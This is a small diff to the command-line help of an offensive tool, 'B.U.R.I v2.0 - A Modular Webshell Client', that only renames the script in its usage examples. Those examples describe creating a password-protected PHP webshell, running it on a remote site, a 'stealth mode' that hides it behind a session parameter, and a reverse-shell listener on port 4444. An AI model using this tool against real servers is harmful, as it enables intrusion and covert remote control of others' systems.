@@ -464,10 +464,10 @@ def main():
         description="B.U.R.I v2.0 - A Modular Webshell Client",
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="Example usage:\n"
-               "  Create shell: buri_v2.0.py create --path shell.php --password 'SuperSecretPass123'\n"
-               "  Run shell:    buri_v2.0.py run https://example.com/shell.php -p 'SuperSecretPass123'\n"
-               "  Stealth mode: buri_v2.0.py run <url> -p <pass> --param 'sessionid'\n"
-               "  Rev shell:    buri_v2.0.py listen --lhost 0.0.0.0 --lport 4444 (then run 'revshell <ip> <port>' in client)"
+               "  Create shell: buri.py create --path shell.php --password 'SuperSecretPass123'\n"
+               "  Run shell:    buri.py run https://example.com/shell.php -p 'SuperSecretPass123'\n"
+               "  Stealth mode: buri.py run <url> -p <pass> --param 'sessionid'\n"
+               "  Rev shell:    buri.py listen --lhost 0.0.0.0 --lport 4444 (then run 'revshell <ip> <port>' in client)"
     )
     subparsers = parser.add_subparsers(dest='action', required=True)
 
